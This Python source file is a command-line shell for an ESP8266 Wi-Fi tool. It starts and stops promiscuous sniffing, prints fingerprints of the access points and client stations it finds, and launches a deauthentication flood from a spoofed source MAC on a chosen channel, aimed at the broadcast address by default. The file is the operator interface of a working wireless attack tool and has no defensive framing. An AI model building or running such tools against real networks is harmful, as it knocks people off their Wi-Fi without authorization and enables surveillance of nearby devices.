import re
import cmd          # https://docs.python.org/3/library/cmd.html#module-cmd
import argparse     # Gentle tutorial: https://docs.python.org/3/howto/argparse.html#argparse-tutorial
                    # Documentation:   https://docs.python.org/3/library/argparse.html
from include.esp_protocol import SerialEsp8266
from include.fingerprint_data import *

ap  = []
sta = []

def validate_mac_address(arg_value):
    mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$') 
    if not mac_pattern.fullmatch(arg_value):
        raise argparse.ArgumentTypeError(f"'{arg_value}' not a valid MAC addr (XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX).")
    return arg_value.upper().replace('-', ':')

s = SerialEsp8266()

class Esp8266CLI(cmd.Cmd):
    intro  = 'ESP8266 sniff&deauth Shell. Write "help" or "?" for cmd infos\n'
    prompt = '(esp8266) $ '

    # --- CMDs ---

    def do_connect(self, arg):
        """
        Perfor connection with ESP8266.
        Usage: connect 
        """
        print("[*] Trying to connect...")
        try:
            if s.connect(): print(f"[+] Connection established")
        except Exception as e: print(e)

    def do_sniff(self, arg):
        """
        Handler for the sniffing process.
        Usage: sniff ( start | stop | fetch )

        Description:
            This command controls the Wi-Fi sniffing functionality on the ESP8266.
            You must choose one action: 'start', 'stop', or 'fetch'.

        Actions:
            start:  Initializes and begins the promiscuous sniffing mode on the ESP8266.
                    The device will start capturing Wi-Fi frames.

            stop:   Halts the active sniffing process on the ESP8266.
                    No further Wi-Fi frames will be captured.

            fetch:  Retrieves all captured Wi-Fi data that is currently stored on the ESP8266.
                    The data will be displayed on the console. Note that large amounts of data
                    might take time to transfer.
        """
        sniff_parser  = argparse.ArgumentParser(prog='sniff')
        sniff_parser.add_argument("-v", "--verbosity", action="store_true", default=0)
        sniff_parser.add_argument(
            'action',
            choices=['start', 'stop', 'fetch'],
            help='Action to be executed: start, stop o fetch.'
        )
        try:
            arg = sniff_parser.parse_args(arg.split())
            if arg.action == 'start':
                if s.sniff_start(): print("[+] ESP8266 started to SNIFF")
                else: print("[!] ERR response recv")
            elif arg.action == 'stop':
                if s.sniff_stop(): print("[+] ESP8266 stopped to SNIFF")
                else: print("[!] ERR response recv")
            elif arg.action == 'fetch':
                print("[*] Fetching sniffed datas...")
                ap.clear()
                sta.clear()
                s.sniff_fetch(ap_list=ap, sta_list=sta)
        except SystemExit: pass
        except Exception as e: print(e)

    def do_deauth(self, arg):
        """
        Performs a deauthentication attack.
        Usage: deauth start <source_mac> <channel> [--dest <destination_mac>]
               deauth stop

        Description:
            The 'start' action initiates a deauthentication attack. If the destination MAC is omitted,
            the attack will target the broadcast address (FF:FF:FF:FF:FF:FF).

        Actions:
            start:  Initializes and begins the attack. A malicious deauthentication payload will be
                    created and sent on the specified Wi-Fi channel from the given source MAC address.

            stop:   Halts any active deauthentication attack initiated by the ESP8266.
        """
        deauth_p = argparse.ArgumentParser(prog='deauth')
        deauth_p.add_argument('-v', '--verbosity', action="store_true", default=0)
        deauth_subp = deauth_p.add_subparsers(dest='action', help='Azione da eseguire', required=True)
        start_parser = deauth_subp.add_parser('start', help='Start Deauth Flood atk')
        start_parser.add_argument('source', type=validate_mac_address, help='Spoof MAC')
        start_parser.add_argument('channel',type=int, choices=range(1, 14),help='Wi-Fi Channel (from 1 to 13).')
        start_parser.add_argument('-d', '--dest', type=validate_mac_address, default="FF:FF:FF:FF:FF:FF", help='Dest MAC (default value: broadcast)')
        stop_parser = deauth_subp.add_parser('stop', help='Stops Deauth Flood atk')
        try:
            args = deauth_p.parse_args(arg.split())
            if args.action == 'start':
                channel = args.channel
                source = bytearray(int(b,16) for b in args.source.split(':'))
                dest   = bytearray(int(b,16) for b in args.dest.split(':'))
                if s.deauth_start(channel, source, dest):
                    if args.verbosity:
                        print(f"""[*] Starting DEAUTH FLOOD atk with:
                              Channel: {args.channel}
                              Source: {args.source}
                              Dest:   {args.dest}""")
                    else: print("[*] Starting DEAUTH FLOOD atk...")
                else: print("[!] ERR response recv")
            elif args.action == 'stop':
                try:
                    if s.deauth_stop(): print("[+] ESP8266 stopped the DEAUTH FLOOD atk")
                    else: print("[!] ERR response recv")
                except Exception as e: print(e)
        except SystemExit: pass
        except Exception as e: print(e)

    def do_ping(self, arg):
        """
        Sends a ping command to the ESP8266 to check connectivity.
        Usage: ping
        
        Description:
            This command sends a simple ping request to the connected ESP8266.
            A successful response indicates that the device is connected and responsive.
        """
        try:
            print("[*] Sending a ping...")
            if s.ping(): print("[+] ACK correctly received")
            else: print("[!] ERR response recv")
        except Exception as e: print(e)

    def do_info(self, arg):
        """
        Retrieves the current status of the sniffing and deauthentication processes on the ESP8266.
        Usage: info
        
        Description:
            This command queries the ESP8266 for the current operational status of its
            sniffing and deauthentication modules, indicating whether they are active or stopped.
        """
        try:
            print("[*] Getting status info...")
            sniff_status,deauth_status = s.info()
            print(f"[+] SNIFF : {'ACTIVE' if sniff_status  else 'STOPPED'}")
            print(f"[+] DEAUTH: {'ACTIVE' if deauth_status else 'STOPPED'}")
        except Exception as e: print(e)

    def do_print(self, arg):
        """
        Prints all currently stored AP and STA device fingerprints.
        Usage: print
        
        Description:
            Displays a detailed list of all Access Points (APs) and Client Stations (STAs)
            that have been sniffed and stored in memory. This includes information such as
            RSSI, MAC addresses, SSIDs, channels, and linked devices.
        """
        print_device_fingerprints(ap,sta)

    def do_close(self, arg):
        """
        Closes the serial connection to the ESP8266.
        Usage: close
        
        Description:
            Attempts to gracefully close the active serial communication port.
            It's good practice to close the connection when no longer needed.
        """
        try: 
            if s.close(): print("[+] SerialEsp8266: Porta seriale chiusa.")
        except Exception as e: print(e)

    def do_clear(self, arg):
        """
        Clears the console screen.
        Usage: clear
        """
        for i in range(20): print('\n')

    def do_quit(self, arg):
        """
        Exits the ESP8266 shell.
        Usage: quit
        
        Description:
            Closes the serial connection to the ESP8266 and terminates the command-line interface.
        """
        if s.is_connected:
            try: s.close()
            except Exception as e: print(e)
        print("ok bro! see u :)")
        return True
    
    def do_q(self, arg):
        """Same as QUIT"""
        return self.do_quit(arg)

    def precmd(self, line):
        try: return line.lower()
        except Exception as e: print(e) 
    
    def emptyline(self):
        pass

    def default(self, line):
        print(f"[x] command not found: {line.split(' ')[0]}")

# --- Funzione Principale per Avviare la CLI ---
if __name__ == '__main__':
    cli = Esp8266CLI()
    cli.cmdloop()
